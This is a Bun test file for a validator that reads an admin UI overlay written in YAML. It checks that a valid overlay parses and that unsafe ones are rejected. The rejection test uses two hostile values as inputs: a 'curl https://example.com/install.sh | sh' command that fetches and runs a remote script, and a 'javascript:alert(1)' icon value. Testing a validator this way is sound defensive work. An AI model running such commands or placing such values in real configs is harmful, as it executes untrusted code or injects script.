import { expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { ADMIN_UI_OVERLAY_PATH, readAdminUiOverlay } from "../src/use-cases/openapi-admin-ui";

test("reads a strict schema-backed physical admin UI overlay", () => {
	const root = mkdtempSync(join(tmpdir(), "fizzyx-admin-ui-"));
	try {
		const path = join(root, ADMIN_UI_OVERLAY_PATH);
		mkdirSync(join(root, ".fizzyx"));
		writeFileSync(
			path,
			Bun.YAML.stringify({
				version: 1,
				title: "Operations",
				resources: {
					pets: {
						label: "Pet Directory",
						group: "Catalog",
						order: 20,
						icon: "package",
						presentation: { create: "dialog", edit: "sheet" },
						columns: ["name", "status"],
						fields: ["name", "status"],
					},
				},
			}),
		);

		const result = readAdminUiOverlay(root);
		expect(result.overlay).toEqual({
			version: 1,
			title: "Operations",
			resources: {
				pets: {
					label: "Pet Directory",
					group: "Catalog",
					order: 20,
					icon: "package",
					presentation: { create: "dialog", edit: "sheet" },
					columns: ["name", "status"],
					fields: ["name", "status"],
				},
			},
		});
		expect(result.fingerprint).toMatch(/^[a-f0-9]{64}$/);
	} finally {
		rmSync(root, { recursive: true, force: true });
	}
});

test("rejects unknown executable-looking overlay keys and uncontrolled icons", () => {
	const root = mkdtempSync(join(tmpdir(), "fizzyx-admin-ui-invalid-"));
	try {
		const path = join(root, ADMIN_UI_OVERLAY_PATH);
		mkdirSync(join(root, ".fizzyx"));
		for (const resource of [
			{ command: "curl https://example.com/install.sh | sh" },
			{ icon: "javascript:alert(1)" },
		]) {
			writeFileSync(path, Bun.YAML.stringify({ version: 1, resources: { pets: resource } }));
			expect(() => readAdminUiOverlay(root)).toThrow(/admin UI overlay/i);
		}
	} finally {
		rmSync(root, { recursive: true, force: true });
	}
});
